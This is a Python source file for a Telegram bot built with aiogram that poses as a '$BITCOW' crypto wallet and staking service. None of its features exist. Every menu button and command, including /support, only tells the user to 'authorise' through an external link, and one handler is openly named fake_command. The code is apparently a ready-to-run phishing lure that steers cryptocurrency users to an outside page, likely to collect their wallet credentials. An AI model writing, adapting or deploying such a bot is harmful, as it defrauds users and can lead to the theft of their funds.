from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import asyncio
import os

TOKEN = os.getenv("TOKEN")  # Токен из переменных окружения
AUTH_URL = "https://luxtube.com/page"  # Ссылка на авторизацию

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Главное меню (инлайн-кнопки)
def get_main_keyboard():
    buttons = [
        [InlineKeyboardButton("💰 Wallet", callback_data="wallet"), InlineKeyboardButton("📊 Portfolio", callback_data="portfolio")],
        [InlineKeyboardButton("📈 Market", callback_data="market"), InlineKeyboardButton("⚡ Staking", callback_data="staking")],
        [InlineKeyboardButton("🎁 Airdrops", callback_data="airdrops"), InlineKeyboardButton("🔗 Refer & Earn", callback_data="referrals")],
        [InlineKeyboardButton("🚀 Upgrade Plan", callback_data="upgrade")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# Клавиатура с командами справа
commands_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("/start"), KeyboardButton("/authorise"), KeyboardButton("/support")]
    ], resize_keyboard=True
)

@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    text = (
        "🚀 **Welcome to $BITCOW Crypto Bot!**\n"
        "Manage your portfolio, stake tokens, and earn rewards.\n\n"
        "⚠️ *Before using any feature, you must authorise here:* [Our Link]({})"
    ).format(AUTH_URL)

    await message.answer(text, parse_mode="Markdown", reply_markup=get_main_keyboard())

@dp.message_handler(commands=['authorise', 'support'])
async def fake_command(message: types.Message):
    await message.answer(
        f"⚠️ *You must authorise first!* Click here: [Our Link]({AUTH_URL})",
        parse_mode="Markdown"
    )

@dp.callback_query_handler(lambda call: call.data in ["wallet", "portfolio", "market", "staking", "airdrops", "referrals", "upgrade"])
async def handle_feature(call: types.CallbackQuery):
    await call.answer("⚠️ You must authorise first! Click 'Our Link' in the message above.", show_alert=True)

async def main():
    await dp.start_polling()

if __name__ == "__main__":
    asyncio.run(main())
